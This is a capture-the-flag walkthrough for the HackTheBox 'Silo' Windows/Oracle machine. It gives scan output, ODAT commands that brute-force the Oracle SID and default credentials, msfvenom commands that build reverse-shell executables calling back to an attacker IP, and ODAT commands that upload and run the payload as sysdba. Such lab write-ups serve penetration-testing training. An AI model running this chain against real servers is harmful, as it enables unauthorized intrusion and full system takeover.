# HTB - Silo  10.10.10.82


- Microsoft Windows Server 2012 R2 Standard
- 6.3.9600 N/A Build 9600
- 149 Hotfix(s) Installed.

- IIS 8.5
- Oracle TNS listener 11.2.0.2.0


- Bruteforce Oracle SID with ODAT and sid list
- Bruteforce user/pass with ODAT and oracle_user_passwd list
- Use ODAT to Upload reverse shell
- Use ODAT to Execute local file (our reverse shell)
- NC Shell is System/Admin




## Walkthrough

- https://0xdf.gitlab.io/2018/08/04/htb-silo.html
-> Nice writeup, some other ways, and rotenpotato

- https://v3ded.github.io/ctf/htb-silo.html
- https://medium.com/@DRX_Sicher/walkthrough-silo-hackthebox-929f7f0a7431
- https://medium.com/@sathish__kumar/hackthebox-silo-writeup-5fe92ac04bb5




## Nmap

````
nmap -sC -sV -oA nmap/initial 10.10.10.82

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn?
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  oracle-tns   Oracle TNS listener (requires service name)                                                                                 49161/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submi
t.cgi?new-service :
SF-Port139-TCP:V=7.70%I=7%D=4/21%Time=5ADBEBEB%P=x86_64-pc-linux-gnu%r(Get
SF:Request,5,"\x83\0\0\x01\x8f");
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2018-04-21 21:58:51
|_  start_date: 2018-04-21 15:47:47
````

## SMB

```
# enum4linux 10.10.10.82
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Sep 22 16:14:47 2019

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.82
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.82    |
 =================================================== 
[E] Can't find workgroup/domain


 =========================================== 
|    Nbtstat Information for 10.10.10.82    |
 =========================================== 
Looking up status of 10.10.10.82
No reply from 10.10.10.82

 ==================================== 
|    Session Check on 10.10.10.82    |
 ==================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.
```


## Oracle

### Install ODAT 


ODAT is found here  : https://github.com/quentinhardy/odat
- Get standalone : https://github.com/quentinhardy/odat/releases/download/2.3/odat-linux-libc2.5-x86_64-v2.3.zip   (Best option)
- Or,install all from scratch and Install Oracle drivers : https://v3ded.github.io/ctf/htb-silo.html

More about Oracle
Metasploit:
    -https://github.com/rapid7/metasploit-framework/wiki/How-to-get-Oracle-Support-working-with-Kali-Linux
    -https://blog.zsec.uk/msforacle/
ODAT:
    -https://github.com/quentinhardy/odat/blob/master/README.md (scroll down to the install section) 


Install odat in /opt
Copy /usr/share/wordlists/metasploit/oracle_default_userpass.txt /opt/odat/accounts then replace space by / =>  LOGIN/PASS


### Brute force SID

```
# /opt/odat/odat sidguesser -s 10.10.10.82 -p 1521

[1] (10.10.10.82:1521): Searching valid SIDs
[1.1] Searching valid SIDs thanks to a well known SID list on the 10.10.10.82:1521 server
[+] 'XE' is a valid SID. Continue...                                                                                                                                   
[+] 'XEXDB' is a valid SID. Continue...                                                                                                                                
100% |##############################################################################################################| Time: 00:02:19 
[1.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.10.10.82:1521)
100% |##############################################################################################################| Time: 00:00:05 
[1.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.10.10.82:1521)
[+] 'XE' is a valid SID. Continue...                                                                                                                                   
100% |##############################################################################################################| Time: 00:02:02 
[+] SIDs found on the 10.10.10.82:1521 server: XE,XEXDB
Failed to execute script odat
```



### Brute force login/password

```# ./opt/odat/odat passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file /opt/odat/accounts/msf_oracle_default_userpass.txt 


[1] (10.10.10.82:1521): Searching valid accounts on the 10.10.10.82 server, port 1521
The login cdemo82 has already been tested at least once. What do you want to do:                                                                      | ETA:  00:02:25 
- stop (s/S)
- continue and ask every time (a/A)
- continue without to ask (c/C)
c
[+] Valid credentials found: scott/tiger. Continue...                                                                                                                  
100% |################################################################################################################################################| Time: 00:03:27 
[+] Accounts found on 10.10.10.82:1521/XE: 
scott/tiger

Failed to execute script odat
```  
    
    
### Reverse shell for windows

```
Meterpreser staged for msf handler
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.14.18 lport=4444 -f exe > reverse.exe

Reverse TCP for nc
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.18 LPORT=4444 -f exe > shell2.exe
```

### Upload file


```
# /opt/odat/odat  utlfile -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/ reverse.exe reverse.exe

[1] (10.10.10.82:1521): Put the reverse.exe local file in the c:/ folder like reverse.exe on the 10.10.10.82 server
[+] The reverse.exe file was created on the c:/ directory on the 10.10.10.82 server like the reverse.exe file

```


### Execute shell

```
/opt/odat/odat externaltable -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/reverse.exe
```

### NC

```

```